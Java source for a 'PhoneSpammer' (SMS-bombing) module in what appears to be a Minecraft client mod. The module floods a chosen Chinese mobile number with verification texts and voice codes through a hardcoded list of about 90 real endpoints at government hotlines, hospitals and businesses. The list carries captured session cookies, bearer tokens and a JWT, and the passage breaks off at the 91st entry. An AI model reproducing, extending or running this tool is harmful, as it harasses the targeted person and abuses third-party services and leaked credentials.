package com.github.lumin.modules.impl.player;

import com.github.lumin.modules.Category;
import com.github.lumin.modules.Module;
import com.github.lumin.settings.impl.BoolSetting;
import com.github.lumin.settings.impl.IntSetting;
import com.github.lumin.settings.impl.StringSetting;
import net.minecraft.network.chat.Component;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.neoforge.client.event.ClientTickEvent;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PhoneSpammer extends Module {

    public static final PhoneSpammer INSTANCE = new PhoneSpammer();

    private final StringSetting phone = stringSetting("手机号", "");
    private final IntSetting loop = intSetting("循环轮数", 1, 1, 100, 1);
    private final BoolSetting debug = boolSetting("调试模式", false);
    private final BoolSetting start = boolSetting("开始轰炸", false);
    private final BoolSetting pause = boolSetting("暂停", false);

    private boolean isRunning = false;
    private final List<ApiTask> apiTasks = new ArrayList<>();

    public PhoneSpammer() {
        super("电话轰炸", "PhoneSpammer", Category.PLAYER);
        initializeApis();
    }

    @SubscribeEvent
    public void onUpdate(ClientTickEvent.Post event) {
        if (start.getValue()) {
            start.setValue(false);
            if (isRunning) {
                sendMessage("§c[PhoneSpammer] 轰炸正在进行中！");
                return;
            }
            String phoneNumber = phone.getValue();
            if (phoneNumber.isEmpty()) {
                sendMessage("§c[PhoneSpammer] 请输入手机号！");
                return;
            }
            if (!phoneNumber.matches("^1\\d{10}$")) {
                sendMessage("§c[PhoneSpammer] 请输入有效的11位手机号！");
                return;
            }

            int loops = loop.getValue();
            startSpam(phoneNumber, loops);
        }
    }

    private void startSpam(String phoneNumber, int loops) {
        isRunning = true;
        sendMessage("§a[PhoneSpammer] 开始轰炸: " + phoneNumber + ", 轮数: " + loops);

        new Thread(() -> {
            try {
                for (int i = 1; i <= loops; i++) {
                    while (pause.getValue() && isRunning) {
                        try {
                            Thread.sleep(500);
                        } catch (InterruptedException ignored) {
                        }
                    }
                    if (!isRunning) break;

                    sendMessage("§7[PhoneSpammer] 第 " + i + " 轮开始...");

                    for (int j = 0; j < apiTasks.size(); j++) {
                        while (pause.getValue() && isRunning) {
                            try {
                                Thread.sleep(500);
                            } catch (InterruptedException ignored) {
                            }
                        }
                        if (!isRunning) break;

                        ApiTask task = apiTasks.get(j);
                        try {
                            boolean success = task.execute(phoneNumber);
                            if (success) {
                                if (debug.getValue()) {
                                    sendMessage("§a[PhoneSpammer] 接口 " + (j + 1) + " 发送成功");
                                } else {
                                    sendMessage("§a接口" + (j + 1) + "发送成功");
                                }
                            } else {
                                if (debug.getValue()) {
                                    sendMessage("§c[PhoneSpammer] 接口 " + (j + 1) + " 失败 (Status != 200)");
                                }
                            }
                        } catch (Exception e) {
                            if (debug.getValue()) {
                                sendMessage("§c[PhoneSpammer] 接口 " + (j + 1) + " 异常: " + e.getMessage());
                            }
                        }

                        try {
                            Thread.sleep(50);
                        } catch (InterruptedException ignored) {
                        }
                    }

                    sendMessage("§a[PhoneSpammer] 第 " + i + " 轮完成。");
                }
                sendMessage("§a[PhoneSpammer] 轰炸结束。");
            } catch (Exception e) {
                sendMessage("§c[PhoneSpammer] 发生错误: " + e.getMessage());
                e.printStackTrace();
            } finally {
                isRunning = false;
            }
        }).start();
    }

    private void sendMessage(String message) {
        if (mc.player != null) {
            mc.execute(() -> {
                if (mc.player != null) {
                    mc.player.displayClientMessage(Component.literal(message), false);
                }
            });
        }
    }

    private void initializeApis() {
        // API 1
        addJson("https://miniapps.nj12345.net/wechatsmallprogram/rest/checkcode/getCheckCode")
                .header("Host", "miniapps.nj12345.net")
                .header("Referer", "https://servicewechat.com/wxed80cacf752b522a/42/page-frame.html")
                .body("{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"mobile\": \"{phone}\"}}");

        // API 2
        addJson("https://www.luzhou12345.cn/app12345wbs.asmx/getInfo")
                .header("Host", "www.luzhou12345.cn")
                .header("Referer", "https://servicewechat.com/wx218d959b2ebd15a7/13/page-frame.html")
                .body("{\"AcceptType\": \"sendwritevercode\", \"AcceptContent\": \"{\\\"Mobile\\\":\\\"{phone}\\\"}\"}");

        // API 3
        addJson("https://12345xcx.shaanxi.gov.cn/xcxrest/rest/applets/onlineUser/getUnloginMsgCode")
                .header("Host", "12345xcx.shaanxi.gov.cn")
                .header("Referer", "https://servicewechat.com/wxd8aa257f596cdad9/44/page-frame.html")
                .body("{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"userMobile\": \"{phone}\", \"validateCodeType\": \"01\"}}");

        // API 4
        addJson("https://www.tbeatcny.cn:10015/zhwl/api/sjzj/verificationCode")
                .header("Host", "www.tbeatcny.cn:10015")
                .header("Referer", "https://servicewechat.com/wx17286984933e6e9e/125/page-frame.html")
                .body("{\"username\": \"{phone}\"}");

        // API 5
        addForm("https://wxpay-web.yixincapital.com/wxpay-web/minBasis/verificationCode")
                .header("Host", "wxpay-web.yixincapital.com")
                .header("yixin", "63f0a60118a1e90f4844c666465ba5b0")
                .header("Referer", "https://servicewechat.com/wxc5bea8c2c3586398/70/page-frame.html")
                .body("openId=IzaKfsCaIjNAhbSJ8mTaJSWPbQJDKW1IidEbQoPPIYE%3D&phone={phone}");

        // API 6
        addJson("https://qyzwfw.cn/cns-bmfw-webrest/rest/mobileUser/getCheckCode")
                .header("Host", "qyzwfw.cn")
                .header("Authorization", "Bearer fa29301a889060f25b6ccad9d2f493b3")
                .header("Referer", "https://servicewechat.com/wxf983f4eb853c26bc/8/page-frame.html")
                .body("{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"mobile\": \"{phone}\"}}");

        // API 7
        addJson("https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode")
                .header("Host", "www.12345hbsz.com")
                .header("Referer", "https://servicewechat.com/wx08f3dbf24a512230/11/page-frame.html")
                .body("{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"phoneNumber\": \"{phone}\"}}");

        // API 8
        addForm("https://www.xysxzspj.com/index/Server/send_code.html")
                .header("Host", "www.xysxzspj.com")
                .header("Referer", "https://servicewechat.com/wx401fdaf166382a62/4/page-frame.html")
                .body("phone={phone}");

        // API 9
        addJson("https://b.aifabu.com/v1/setSmsCode")
                .header("Host", "b.aifabu.com")
                .header("Origin", "https://www.aifabu.com")
                .header("Referer", "https://www.aifabu.com/register")
                .body("{\"phone\": \"{phone}\", \"type\": 1}");

        // API 10
        addJson("https://userapi.heaye.shop/api/auth/sendSms")
                .header("Host", "userapi.heaye.shop")
                .header("Authorization", "Bearer oHQMv5f-j93ZBVLZVN5P5f8Ehrms")
                .header("Referer", "https://servicewechat.com/wx38bb9a6b3ddc1d77/177/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 11
        addForm("https://www.mytijian.com/main/action/mobileValidationCode?_site=hnszsy&_siteType=mobile&_p=&clientVersion=v1.1.6")
                .header("Host", "www.mytijian.com")
                .header("unique-submit-token", "2a87e5f9-c78a-4c50-9830-e715d9dbf134_1710752032041")
                .header("x-mytjian-client", "WECHAT_MINI_APP")
                .header("Cookie", "SESSION=686cdb0d-abb1-461f-8349-a9d441c78948;")
                .header("Referer", "https://servicewechat.com/wx650990c67b116478/31/page-frame.html")
                .body("scene=6&mobile={phone}");

        // API 12
        addJson("https://health.gz12hospital.cn:6603/smartpe-busi-service/app/captcha")
                .header("Host", "health.gz12hospital.cn:6603")
                .header("Referer", "https://servicewechat.com/wx7ec9015f854756ec/14/page-frame.html")
                .body("{\"archiveCode\": \"440130\", \"mobile\": \"{phone}\"}");

        // API 13
        addJson("https://a.welife001.com/applet/sendVerifyCode")
                .header("Host", "a.welife001.com")
                .header("x-rid", "3ACFBC8F-F10E-454F-80F7-E9CF80EFA70B")
                .header("imprint", "oWRkU0UWqnOnuclLWq1fDw0SHnqs")
                .header("Referer", "https://servicewechat.com/wx23d8d7ea22039466/2307/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 14
        addJson("https://mc.tengmed.com/formaltrpcapi/patient_manager/sendPhoneVerifyCode")
                .header("Host", "mc.tengmed.com")
                .header("Th-Session-Id", "nszli17107510056466xqDMumPGcno4AcG2RgBl4N5IbUa27137d0-wx")
                .header("Th-Auth-Type", "tencent-health-mini")
                .header("Th-Appid", "wxc35283883e1d86d5")
                .header("Referer", "https://servicewechat.com/wxc35283883e1d86d5/240/page-frame.html")
                .body("{\"request\": {\"commonIn\": {\"requestId\": \"5cbc9535-fbe7-4f39-8902-37bf8ef68889\", \"channel\": \"\"}, \"phone\": \"{phone}\"}}");

        // API 15
        addJson("https://ls.xzrcfw.com/App/Sys/SendPhoneCode")
                .header("Host", "ls.xzrcfw.com")
                .header("Referer", "https://servicewechat.com/wx244d94feafd1e7f7/8/page-frame.html")
                .body("{\"requestModel\": {\"phone\": \"{phone}\", \"OptionType\": 1, \"Role\": 2}, \"Token\": null, \"Source\": \"MiniProject\", \"Platform\": 2, \"isTibetan\": false}");

        // API 16
        addJson("https://qjpt.dypmw.com/api/xilujob.sms/send")
                .header("Host", "qjpt.dypmw.com")
                .header("cityid", "0")
                .header("Referer", "https://servicewechat.com/wx3a1972bbf0d8aaee/17/page-frame.html")
                .body("{\"mobile\": \"{phone}\"}");

        // API 17
        addForm("https://www.hnzgfwpt.cn/ums-wechat/sms/send-code")
                .header("Host", "www.hnzgfwpt.cn")
                .header("Referer", "https://servicewechat.com/wx66e8d31ce1746b26/15/page-frame.html")
                .body("unionid=oLhND6juFSLTyPDtojyUxFrpZQuQ&mobile={phone}&msgPrefix=【河南新就业工会】");

        // API 18
        addForm("https://applets.qinyunjiuye.cn/sxzhjy_h5/tel/telmessage/save")
                .header("Host", "applets.qinyunjiuye.cn")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("Origin", "https://applets.qinyunjiuye.cn")
                .header("Referer", "https://applets.qinyunjiuye.cn/sxzhjy_h5/common/register")
                .header("Cookie", "sxzhjy_h5_JSESSIONID=5a1224a5-8522-4728-98a5-63e77895b46e; x_host_key=18e50dcb1bb-08f9fcecc48af8278514a5c43164c331fa74d2ce")
                .body("telephone={phone}");

        // API 19
        addJson("https://edu.jsgpa.com/admin/apis/user/api/user/send/code")
                .header("Host", "edu.jsgpa.com")
                .header("Referer", "https://servicewechat.com/wxf54a2e4b15af66b6/8/page-frame.html")
                .body("{\"phone\": \"{phone}\", \"type\": 1}");

        // API 20
        addJson("https://eibp-api.ynjspx.cn/before/captcha/smsCode")
                .header("Host", "eibp-api.ynjspx.cn")
                .header("Referer", "https://servicewechat.com/wxb489afebd817b08c/37/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 21
        addJson("https://yuanzhijiekeji.cn/api.html")
                .header("Host", "yuanzhijiekeji.cn")
                .header("Referer", "https://servicewechat.com/wx5f54ab339a33e547/5/page-frame.html")
                .body("{\"mobile\": \"{phone}\", \"code\": \"reg\", \"method\": \"user.sms\"}");

        // API 22
        addJson("https://826625173.ehpp.club/weapp/customer/getCheckNo")
                .header("Host", "826625173.ehpp.club")
                .header("Cookie", "koa:sess=eyJza2V5IjoiZTE3Nzc0NTVmNTFhZjQ3ZmFkOThmMTYwOTE2ODVjZTY1OTc4Yzg0MiIsInVzZXJpbmZvIjp7InVpZCI6MzU2OSwib3BlbklkIjoib1dBNmE1WGJGYlVjS3VjS29xOU04R1UweXV1NCIsIm5pY2tOYW1lIjoi5b6u5L+h55So5oi3IiwiYXZhdGFyVXJsIjoiaHR0cHM6Ly90aGlyZHd4LnFsb2dvLmNuL21tb3Blbi92aV8zMi9QT2dFd2g0bUlITzRuaWJIMEtsTUVDTmpqR3hRVXEyNFpFYUdUNHBvQzZpY1JpY2NWR0tTeVh3aWJjUHE0QldtaWFJR3VHMWljd3hhUVg2Z3JDOVZlbVpvSjhyZy8xMzIiLCJyZWFsTmFtZSI6bnVsbCwiZ2VuZGVyIjowLCJwcm92aW5jZSI6IiIsImNvdW50cnkiOiIiLCJjaXR5IjoiIiwiY29tcGFueU5hbWUiOm51bGwsImNvbXBhbnlpZCI6bnVsbCwiYm9udXMiOjAsInRvdGFsX2JvbnVzIjowLCJsYXN0X3VwbG9hZF9ydW5fdGltZSI6bnVsbCwiY3JlYXRlX3RpbWUiOiIyMDI0LTAzLTIyVDA1OjE2OjA3LjAwMFoiLCJhaWQiOm51bGwsInBob25lIjoiIiwibWVtYmVyIjowLCJtZW1iZXJfdXBkYXRlIjoiMjAyNC0wMy0yMlQwNToxNjowNy4wMDBaIiwibWVtYmVyX2xldmVsIjpudWxsfSwiX2V4cGlyZSI6MTcxMTY4OTM2NzI3MiwiX21heEFnZSI6NjA0ODAwMDAwfQ==; path=/; expires=Fri, 29 Mar 2024 05:16:07 GMT; httponly")
                .header("Referer", "https://servicewechat.com/wx10456ccd8ac36129/29/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 23
        addForm("https://media.hzj7.com/index.php/App800/Login/phone_code")
                .header("Host", "media.hzj7.com")
                .header("Referer", "https://servicewechat.com/wx26b5da4a7499bd28/10/page-frame.html")
                .body("phone={phone}");

        // API 26
        addJson("https://shop.zdjt.com/api.html")
                .header("Host", "shop.zdjt.com")
                .header("Referer", "https://servicewechat.com/wx90330e7d263388a9/57/page-frame.html")
                .body("{\"mobile\": \"{phone}\", \"code\": \"bind\", \"method\": \"user.sms\"}");

        // API 27
        addJson("https://smart.shuye.com/api/sms/send")
                .header("Host", "smart.shuye.com")
                .header("token", "[object Null]")
                .header("Referer", "https://servicewechat.com/wxd244e1bddbd29494/10/page-frame.html")
                .body("{\"mobile\": \"{phone}\", \"event\": \"login\"}");

        // API 28 (GET)
        addGet("https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/?phone={phone}&type=2")
                .header("Host", "delivery-api.imdada.cn")
                .header("App-Name", "i-dada")
                .header("Unique-Id", "344EF073-E5E4-42FC-A354-36148D490572")
                .header("Platform", "iOS");

        // API 29
        addJson("https://weixin-nj.pcmh.com.cn/sms-gateway/aliyun/identity-verification?organization-id=11510901345812856P")
                .header("Host", "weixin-nj.pcmh.com.cn")
                .header("Referer", "https://servicewechat.com/wx43f08083ad884950/20/page-frame.html")
                .body("{\"mobile\": \"{phone}\"}");

        // API 30
        addJson("https://www.hylyljk.com/ymm-common/sms/sendSmsCode")
                .header("Host", "www.hylyljk.com")
                .header("userType", "2")
                .header("Referer", "https://servicewechat.com/wx155e63b80773f98c/7/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 31
        addJson("https://api.zyydjk.net/message/public/sendSms")
                .header("Host", "api.zyydjk.net")
                .header("deviceId", "1234567890-1234567890-1234567890")
                .header("authorization", "bearer oHY_55PTtR6BhnMQXQFTuI0EMk3A")
                .header("Referer", "https://servicewechat.com/wxbe9f76c35c45111c/44/page-frame.html")
                .body("{\"phone\": \"{phone}\", \"MethodWay\": 1, \"Product\": 1}");

        // API 32
        addForm("https://m.ylzhaopin.com/Wxapi/Account/getverify")
                .header("Host", "m.ylzhaopin.com")
                .header("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ5cHdwcm9ncmFtIiwibmFtZSI6Im85THlSNjhmM3A3R2MtLWoybjBIT2hlbjlQVDgiLCJpYXQiOjE3MTExOTA3NzIsImV4cCI6MTcxMTE5Nzk3Mn0.nS8C4L6ZVGDjjxA_VmzyTgoGG7gcMafXrgL9X0KpSRo")
                .header("Referer", "https://servicewechat.com/wxb6c159d78b2a6399/4/page-frame.html")
                .body("tel={phone}");

        // API 33
        addJson("https://mapi.jialongjk.com/api/user/verify/mobile/code")
                .header("Host", "mapi.jialongjk.com")
                .header("device-version", "10")
                .header("uuid", "086b92f4509178b3321197b1bbe1642b")
                .header("Referer", "https://servicewechat.com/wxdbea4bfc433b0017/65/page-frame.html")
                .body("{\"from\": \"dynamic_login\", \"mobile\": \"{phone}\"}");

        // API 100
        addJson("https://product.yl1001.com/api-yp/register/sendSmsCode")
                .header("Host", "product.yl1001.com")
                .header("SecretKey", "94cbe78f3bcec8be81d68e7bdfb9ad9b")
                .header("Referer", "https://servicewechat.com/wxcbfa127f857c2790/308/page-frame.html")
                .body("{\"mobile\": \"{phone}\"}");

        // API 34
        addForm("https://superdesk.avic-s.com/super_cloud/api/wechat/front/smsCode")
                .header("Host", "superdesk.avic-s.com")
                .header("Referer", "https://servicewechat.com/wx0efbe4601aed7dfe/49/page-frame.html")
                .body("mobile={phone}&orgId=-1&type=0");

        // API 35
        addJson("https://wx-prm.bshcn.com.cn/*.jsonRequest")
                .header("Host", "wx-prm.bshcn.com.cn")
                .header("B-Product-Code", "hcn.sh-pdxqrmyy.patient_mini")
                .header("X-Service-Method", "registerSmsCodeNew")
                .header("Referer", "https://servicewechat.com/wxca096f515338c55b/159/page-frame.html")
                .body("[\"hcn.sh-pdxqrmyy.patient_mini\", \"{phone}\"]");

        // API 36
        addJson("https://user.zjzwfw.gov.cn/nuc/reg/sendSmsCode")
                .header("Host", "user.zjzwfw.gov.cn")
                .header("guc-accountType", "person")
                .header("Referer", "https://servicewechat.com/wx289ade03af020941/39/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 37
        addJson("https://96885wx.hrss.jl.gov.cn/minifast/frontRestService/frontBcpDataRestService/getBcpData")
                .header("Host", "96885wx.hrss.jl.gov.cn")
                .header("Referer", "https://servicewechat.com/wx93486ef87cedbd44/139/page-frame.html")
                .body("{\"methodName\": \"JRZX_093\", \"loginNo\": \"{phone}\", \"loginType\": \"10\", \"yae100\": \"12\", \"siteToken\": \"\"}");

        // API 38
        addJson("https://m.52xiaoyuan.cn/mapp/getMappSmsCode")
                .header("Host", "m.52xiaoyuan.cn")
                .header("dhash", "eda4e699e178c69039367ce5f7b871dd")
                .header("Referer", "https://servicewechat.com/wx56c43729cf6a360a/25/page-frame.html")
                .body("{\"mobile\": \"{phone}\", \"module\": \"xykt_gctc\"}");

        // API 39
        addJson("https://sqsz.shiyan.gov.cn/smartCommunity/appsend/sendCode?time=1711225888672&sign=516256e7e7ae11f7ac9a51eb6c4e0da4")
                .header("Host", "sqsz.shiyan.gov.cn")
                .header("headdata", "%7B%22data_value%22%3A%2217343387439%22%2C%22flag%22%3A0%2C%22send_type%22%3A1%2C%22communityId%22%3A6%2C%22roleId%22%3A2%2C%22user_id%22%3A246756%7D")
                .header("Referer", "https://servicewechat.com/wx75e106ac21a7eea8/46/page-frame.html")
                .body("{\"data_value\": \"{phone}\", \"flag\": 0, \"send_type\": 1, \"communityId\": 6, \"roleId\": 2, \"user_id\": 246756}");

        // API 40
        addJson("https://ehr-recruitment.yifengx.com/restful/login/sendMessage")
                .header("Host", "ehr-recruitment.yifengx.com")
                .header("Referer", "https://servicewechat.com/wx1768e077cefc65b1/79/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 119
        addForm("https://passport.xag.cn/home/sms_code")
                .header("Host", "passport.xag.cn")
                .header("Authorization", "Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi")
                .header("Referer", "https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html")
                .body("icc=86&phone={phone}");

        // API 121
        addJson("https://wap-api.duoyou.com/index.php/member/send_verification?game_id=100206&media_id=dy_59639386&is_red_sdk=1&idfa=89238414-3824-4F4D-BC95-8DABAB134023")
                .header("Host", "wap-api.duoyou.com")
                .header("Origin", "https://wap.duoyou.com")
                .header("Referer", "https://wap.duoyou.com/")
                .body("{\"scene\": \"smsLogin\", \"mobile\": \"{phone}\"}");

        // API 41
        addForm("https://yf.yifengyunche.com/admin/yfycapp/get_sms/secret/f68a6f6e071090621458faeed3cbc781")
                .header("Host", "yf.yifengyunche.com")
                .header("Referer", "https://servicewechat.com/wx21fd3633e52da572/66/page-frame.html")
                .body("phone={phone}&sms_type=xcx_login&uuid=oguyl5B1fCGz-AgAXyi1DEhCykPE");

        // API 42
        addForm("https://account.xiaomi.com/pass/sns/wxapp/v2/sendTicket")
                .header("Host", "account.xiaomi.com")
                .header("Referer", "https://servicewechat.com/wx183d85f5e5e273c6/15/page-frame.html")
                .body("phone={phone}&sid=micar_wxlite");

        // API 43
        addForm("https://api.kq36.com/public/returnhtm/return_uni-app.asp?cmd=login_user_phone")
                .header("Host", "api.kq36.com")
                .header("ua", "{\"v\":3,\"n\":\"mp-weixin\"}")
                .header("Referer", "https://servicewechat.com/wx01c584b2a7cd0c15/264/page-frame.html")
                .body("mobile={phone}&typen=login&uid=oZqPrs4_EwbdKo5yZsiQhzPr29iA");

        // API 44
        addJson("https://newretail2.xianfengsg.com/newretail/api/sms/sendSms")
                .header("Host", "newretail2.xianfengsg.com")
                .header("wxa-appid", "wxb34bc4be8e276ed8")
                .header("Referer", "https://servicewechat.com/wxb34bc4be8e276ed8/719/page-frame.html")
                .body("{\"mobile\": \"{phone}\"}");

        // API 45
        addJson("https://www.zara.cn/itxrest/1/user/store/11716/verify/send-code?languageId=-7")
                .header("Host", "www.zara.cn")
                .header("ITX-APPID", "ZaraWechat wxd95a72c5f595b6a3")
                .header("Referer", "https://servicewechat.com/wxd95a72c5f595b6a3/334/page-frame.html")
                .body("{\"phone\":{\"countryCode\":\"+86\",\"subscriberNumber\":\"{phone}\"}}");

        // API 46
        addJson("https://xiaoshou.lujiandairy.com/api/wx/send/mobile/bind_mobile")
                .header("Host", "xiaoshou.lujiandairy.com")
                .header("Referer", "https://servicewechat.com/wx881f659964749509/15/page-frame.html")
                .body("{\"mobile\": \"{phone}\"}");

        // API 47
        addJson("https://api.kucee.com/website.Access/getPhoneCode")
                .header("Host", "api.kucee.com")
                .header("W-Token", "4276")
                .header("AppId-Token", "wx942a1bf556cf82ed")
                .header("Uni-Code", "633f39b271e585b3ed3af77237320e21")
                .header("Referer", "https://servicewechat.com/wx942a1bf556cf82ed/1/page-frame.html")
                .body("{\"phone\": \"{phone}\", \"type\": 1, \"lat\": 12435, \"lng\": 8946, \"storeId\": 0, \"appId\": \"wx942a1bf556jsnsb\", \"scene\": 1053}");

        // API 48
        addForm("https://api.jmfww.com/api/Common/GetMobileCode")
                .header("Host", "api.jmfww.com")
                .header("Referer", "https://servicewechat.com/wxe1329bb7bf594139/9/page-frame.html")
                .body("mobile={phone}&type=2");

        // API 49
        addJson("https://ehospital-members.sq580.com/v1_0/ehospital/app/common/sendVerifyCode")
                .header("Host", "ehospital-members.sq580.com")
                .header("Referer", "https://servicewechat.com/wxaf36c6d75fa74101/70/page-frame.html")
                .body("{\"phone\": \"{phone}\"}");

        // API 50
        addJson("https://hospital.fjlyrmyy.com/ihp-gateway/api/cms/sendCode")
                .header("Host", "hospital.fjlyrmyy.com")
                .header("Referer", "https://servicewechat.com/wxc8153d762f458c41/6/page-frame.html")
                .body("{\"transType\": \"\", \"param\": {\"phone\": \"{phone}\", \"codeType\": \"LOGIN\", \"miniOpenId\": \"o41bz5Tif8yAhus3xP5M4ypm3N0c\"}, \"appId\": \"8a8a87106b72a440016b72bf44a10000\", \"deviceId\": \"04daccefc14033ed3d18f157a9f6d1d8\", \"signType\": \"MD5\", \"termType\": \"WX_MINI\", \"version\": \"1.0.0\"}");

        // API 51
        addJson("https://homedoctor.grdoc.org/api/common/captcha/send")
                .header("Host", "homedoctor.grdoc.org")
                .header("token", "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4")
                .header("client", "windows-applet-1.0.0")
                .header("Referer", "https://servicewechat.com/wx931cd4767b40b972/5/page-frame.html")
                .body("{\"token\": \"69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4\", \"role\": \"user\", \"scene\": 1, \"telephone\": \"{phone}\"}");

        // API 52
        addGet("https://ai.gzquankeinfo.com:8061/api/sms/sms/valcode?phone={phone}&orgCode=10000001");

        // API 53
        addGet("https://hxxs.mrrac.com/sendCode?mobile={phone}");

        // API 54
        addGet("https://ggfw.rlsbj.cq.gov.cn/xcb/zgbtxt/zpw_hd/code?tel={phone}&uuid=");

        // API 55
        addGet("https://remote-meter.cn:8098/mt-flowJingM/applet/user/profiles/getCode?phone={phone}");

        // API 56
        addGet("https://cxdc.mybti.cn:3700/ps/api/SendVerifyCode?phoneNumber={phone}");

        // API 57
        addGet("https://szjy.yyjqrj.net:9011/api/sms/sms/valcode?phone={phone}&orgCode=");

        // API 58
        addGet("https://isus.vip/cgi.sms.send?mobile={phone}");

        // API 59
        addGet("https://wsylfw.org315.cn/htohcloud-admin/service/getSmsCode?phoneNum={phone}");

        // API 60
        addGet("https://zhaopin.baihepan.com/prod-api/captchaSms?timestamp=1711529949073&phonenumber={phone}");

        // API 61
        addGet("https://www.iotlot.cn/api/main/verifyCode?phone={phone}");

        // API 62
        addGet("https://wechatapp.baofengenergy.com:5022/pms/appLogin/code?phone={phone}&isRegister=true");

        // API 63
        addForm("https://maicai.api.ddxq.mobi/user/getSms")
                .header("Host", "maicai.api.ddxq.mobi")
                .header("ddmc-city-number", "0101")
                .header("ddmc-build-version", "4.17.3")
                .header("ddmc-os-version", "Windows 10 x64")
                .header("ddmc-channel", "applet")
                .header("ddmc-api-version", "11.17.0")
                .header("ddmc-app-client-id", "4")
                .header("Referer", "https://servicewechat.com/wx1e113254eda17715/609/page-frame.html")
                .body("uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.17.0&app_version=4.17.3&channel=applet&app_client_id=4&s_id=573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g&openid=osP8I0awRCC_O1WiPSvhuWwJTAD4&device_id=osP8I0awRCC_O1WiPSvhuWwJTAD4&h5_source=&time=1714852018&device_token=WHJMrwNw1k%2FG0%2Fi%2BZiR4QiSBilQrUFhr7NLVbXikVsBN4l%2BOKowg9f8FaBMv%2BtaRplcweYZ6SDl1r7HAdJk%2F7PjsEueh9QrdCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile={phone}&verify_code=&type=3&area_code=86&showData=True&app_client_name=wechat&nars=6cbb1f42a9ee475803d1d4e4c1eed7a9&sesi=%7B%22sesiT%22%3A%22FgyjShta664c3c02804207401279c151d7e6f1ac%22%2C%22sdkv%22%3A%222.0.0%22%7D");

        // API 64
        addGet("https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={phone}&type=1");

        // API 65
        addGet("https://s.i.bucg.com/es/sendSms?phone={phone}");

        // API 66
        addGet("https://clgl.cadc.net.cn/api/Base/GetSmsCheckcode?telno={phone}&checkdup=1&areaid=&rolecode=TJKS");

        // API 67
        addGet("https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile={phone}&code=&checkNotFlag=1");

        // API 68
        addGet("https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile={phone}&validateCodeType=01");

        // API 69
        addGet("https://cd12345.pointlinkprox.com:9443/scmd/chain/sendSMSCode?custPhone={phone}&tenantId=83ad2a2955f34ec5b9d30eb590e284d6");

        // API 70
        addGet("https://www.htjdxf.com/prod-api/applet/captcha/send/2/{phone}");

        // API 71
        addGet("https://dhswyt.qz-soft.com//tools/wechatmember.ashx?action=SendPhoneCode&phone={phone}");

        // API 72
        addGet("https://yjzl.xzweijiancha.cn/client/front/wxUser/token/{phone}");

        // API 73
        addGet("https://bsx.baoding12345.cn/web/bduser/register?mobile={phone}");

        // API 74
        addGet("https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile={phone}&operateType=18");

        // API 75
        addGet("https://cgj.lasa.gov.cn/eGovaPublic/mi/app/sendidentifycode?phoneNum={phone}&corName=egova&isJsonp=1&cityCode=100&terminalID=7&access_token=&token=");

        // API 76
        addGet("http://user.daojia.com/mobile/getcode?mobile={phone}");

        // API 77
        addGet("https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone={phone}&Captcha=&_=1627172292814");

        // API 78
        addGet("http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={phone}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347");

        // API 79
        addGet("https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile={phone}");

        // API 80
        addGet("https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1");

        // API 81
        addGet("https://xwwl-api.easthope.cn/ums/captcha/driverLoginSms?captchaToken=123&mobile={phone}&imageText=mas6");

        // API 82
        addGet("https://wx.rsj.baoji.gov.cn/bjwxVeifyPhone.action?phone={phone}");

        // API 83
        addGet("https://api.jiuyeyuren.com/api/user/sendcode?phone={phone}&public_source=3&apptype=ysyc");

        // API 84
        addGet("https://shark.x.ufans.cn/bapi/sms?mobile={phone}");

        // API 85
        addGet("https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile={phone}&validateCodeType=01");

        // API 86
        addGet("https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile={phone}&operateType=18");

        // API 87
        addGet("https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=1");

        // API 88
        addGet("https://gemini.minxundianzi.com/marsplan/mars/user/sendSmsCode?countryCode=86&userTel={phone}&type=1");

        // API 89
        addGet("https://bfat.minxundianzi.com/yunjibodyfat/web/sendSmsCode?countryCode=86&userTel={phone}");

        // API 90
        addGet("https://curiousmore.com/qmore/user/sms/send?is_teach_paypal=true&mobile={phone}");

        // API 91
